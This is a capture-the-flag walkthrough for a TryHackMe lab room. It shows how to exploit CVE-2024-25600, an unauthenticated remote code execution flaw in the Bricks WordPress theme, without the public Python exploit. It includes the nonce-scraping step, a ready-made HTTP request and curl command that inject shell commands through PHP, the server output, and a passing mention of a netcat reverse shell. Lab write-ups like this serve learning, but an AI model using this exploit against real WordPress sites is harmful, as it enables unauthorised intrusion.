# TryHack3M: Bricks Heist

https://tryhackme.com/r/room/tryhack3mbricksheist

Part of the 3mil challenge, rated Easy

This walkthrough won't cover the whole room, just the first portion where you are exploiting a CVE. I wanted to show how to do it without python.

The CVE is CVE-2024-25600, an unauthenticated remote code execution vuln in the bricks wordpress theme, pretty nasty stuff. There is an excellent public exploit for this here, written in Python: https://github.com/Chocapikk/CVE-2024-25600

I personally hate python because of its dependency hell nonsense. Here in particular as I was using the THM attack box which doesn't have python 3.10+ required for the above, I couldn't just clone and use the exploit.

However! It is trivial to exploit this vulnerability by hand! There are only two steps:

1. First, get the nonce for bricks. This is found in a block of json on the homepage of the bricks site:

```
<script id="bricks-scripts-js-extra">
var bricksData = ...,"nonce":"2ce88d6cd2",...
</script>****
```

2. Second, make a post request like so:

```
`POST /wp-json/bricks/v1/render_element HTTP/2
Host: bricks.thm
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Content-Type: application/json
Content-Length: 154

{"postId": 1,"nonce": "2ce88d6cd2","element": {"name": "code","settings": {"executeCode": "true","code": "<?php throw new Exception(`pwd` . 'END'); ?>"}}}
```

Note the `pwd` surrounded by backticks, which is where the command is injected. This could be done with Burp, or even just using curl e.g.: 

```
curl --path-as-is -i -s -k -X $'POST' \
    -H $'Host: bricks.thm' -H $'Accept-Language: en-GB,en-US;q=0.9,en;q=0.8' -H $'Content-Type: application/json' -H $'Content-Length: 154' \
    --data-binary $'{\"postId\": 1,\"nonce\": \"2ce88d6cd2\",\"element\": {\"name\": \"code\",\"settings\": {\"executeCode\": \"true\",\"code\": \"<?php throw new Exception(`pwd` . \'END\'); ?>\"}}}' \
    $'https://bricks.thm/wp-json/bricks/v1/render_element'
```

The result will be something like:

```
HTTP/2 200 OK
X-Robots-Tag: noindex
Link: <https://bricks.thm/wp-json/>; rel="https://api.w.org/"
X-Content-Type-Options: nosniff
Access-Control-Expose-Headers: X-WP-Total, X-WP-TotalPages, Link
Access-Control-Allow-Headers: Authorization, X-WP-Nonce, Content-Disposition, Content-MD5, Content-Type
Allow: POST
Content-Length: 56
Content-Type: application/json; charset=UTF-8
Date: Sun, 05 May 2024 08:45:42 GMT
Server: Apache

{"data":{"html":"Exception: \/data\/www\/default\nEND"}}
```

Easy peasy lemon squezy. The box has nc.openbsd on it so I just shoved a nc fifo payload to get a rev shell.

The rest of the room is pretty straight forward, so no need to go through it. Just a note later there is a log file with a long 'ID' in it - this is actually a hex string and after being decoded a bit will reveal a repeated bitcoin address - that tripped me up. Good luck!
